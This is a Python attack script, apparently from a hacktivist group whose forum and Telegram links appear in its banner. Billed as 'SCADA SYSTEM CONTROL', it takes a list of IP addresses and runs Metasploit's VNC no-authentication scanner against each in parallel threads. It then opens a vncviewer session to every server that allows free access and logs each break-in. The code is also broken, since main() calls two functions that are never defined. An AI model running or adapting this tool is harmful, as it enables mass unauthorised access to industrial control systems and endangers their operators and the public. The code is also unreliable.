# Author: Pari Malam

import logging
import argparse
import subprocess
import shutil
import os
from sys import stdout
from colorama import Fore, Style, Back, init
from concurrent.futures import ThreadPoolExecutor

def banners():
    clear()
    stdout.write("                                                                                         \n")
    stdout.write(""+Fore.LIGHTRED_EX +"███████╗ ██████╗ █████╗ ██████╗  █████╗\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██╔════╝██╔════╝██╔══██╗██╔══██╗██╔══██╗\n")
    stdout.write(""+Fore.LIGHTRED_EX +"███████╗██║     ███████║██║  ██║███████║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"╚════██║██║     ██╔══██║██║  ██║██╔══██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"███████║╚██████╗██║  ██║██████╔╝██║  ██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"╚══════╝ ╚═════╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝\n")
    stdout.write(""+Fore.YELLOW +"═════════════╦═════════════════════════════════╦════════════════════════════════════════════════════════════\n")
    stdout.write(""+Fore.YELLOW   +"╔════════════╩═════════════════════════════════╩═════════════════════════════╗\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"AUTHOR             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   PARI PARI-MALAM                               "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"GITHUB             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   HTTPS://GITHUB.COM/PARI-MALAM                 "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"╔════════════════════════════════════════════════════════════════════════════╝\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"OFFICIAL FORUM     "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   HTTPS://DRAGONFORCE.IO                        "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"OFFICIAL TELEGRAM  "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   HTTPS://TELEGRAM.ME/DRAGONFORCEIO             "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"╚════════════════════════════════════════════════════════════════════════════╝\n") 
    print(f"{Fore.YELLOW}[SCADA SYSTEM CONTROL] - {Fore.GREEN}Perform With Vulnerable VNC/TIGH Server Port Scanner\n")
banners()

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler("scan_ips.log"),
        logging.StreamHandler()
    ]
)

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    ENDC = '\033[0m'

def dirdar():
    if not os.path.exists('Results'):
        os.mkdir('Results')

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def colorize(level, msg):
    color_mapping = {
        logging.ERROR: Colors.RED,
        logging.WARNING: Colors.YELLOW,
        logging.INFO: Colors.GREEN
    }
    color = color_mapping.get(level, "")
    return f"{color}{msg}{Colors.ENDC}" if color else msg

def check_msf_output(output):
    return "VNC server security types includes None, free access!" in output

def run_msf_command(ip_address):
    command = (
        f"use auxiliary/scanner/vnc/vnc_none_auth; "
        f"set verbose true; set rhost {ip_address}; set rport 5900; run; exit"
    )
    try:
        msf_output = subprocess.check_output(
            ["msfconsole", "-n", "-q", "-x", command],
            universal_newlines=True,
            stderr=subprocess.STDOUT
        )
    except subprocess.CalledProcessError as e:
        logging.error(colorize(logging.ERROR, f"Error running Metasploit Framework command for {ip_address}: {e.output.strip()}"))
        return None
    else:
        return msf_output.strip()

def install_vnc_viewer():
    try:
        subprocess.run(["sudo", "apt-get", "install", "-y", "vncviewer"], check=True)
    except subprocess.CalledProcessError as e:
        logging.error(colorize(logging.ERROR, f"Error installing VNC viewer: {e.stderr.strip()}"))

def save_successful_connection(ip_address):
    result_file = os.path.join("Results", f"{ip_address}_success.txt")
    with open(result_file, "w") as f:
        f.write("Successful VNC connection was established.")

def scan_ip(ip_address):
    logging.info(colorize(logging.INFO, f"Scanning {ip_address}..."))
    msf_output = run_msf_command(ip_address)

    if msf_output is not None and check_msf_output(msf_output):
        logging.info(colorize(logging.INFO, "VNC server security types include None, free access! Attempting to connect with vncviewer..."))
        if vncviewer_path is None:
            logging.error(colorize(logging.ERROR, "VNC viewer is not installed. Skipping connection attempt."))
        else:
            try:
                subprocess.run(["vncviewer", ip_address], check=True)
                save_successful_connection(ip_address)
            except subprocess.CalledProcessError as e:
                logging.error(colorize(logging.ERROR, f"Error connecting to VNC server at {ip_address}: {e.stderr.strip()}"))
    else:
        logging.info(colorize(logging.INFO, "VNC server security types do not include None, free access."))

def main():
    init()

    parser = argparse.ArgumentParser(description="Scan for VNC server security vulnerabilities.")
    parser.add_argument("-f", "--file", required=True, help="Input file containing IPs or domain list")
    parser.add_argument("-t", "--threads", type=int, default=1, help="Number of threads for concurrent scanning")
    args = parser.parse_args()

    create_results_directory()
    clear_screen()

    global vncviewer_path
    vncviewer_path = shutil.which("vncviewer")
    if vncviewer_path is None:
        logging.warning(colorize(logging.WARNING, "vncviewer command not found. Attempting to install VNC viewer..."))
        install_vnc_viewer()

    with open(args.file) as f:
        ip_list = [line.strip() for line in f]

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        executor.map(scan_ip, ip_list)

if __name__ == "__main__":
    main()
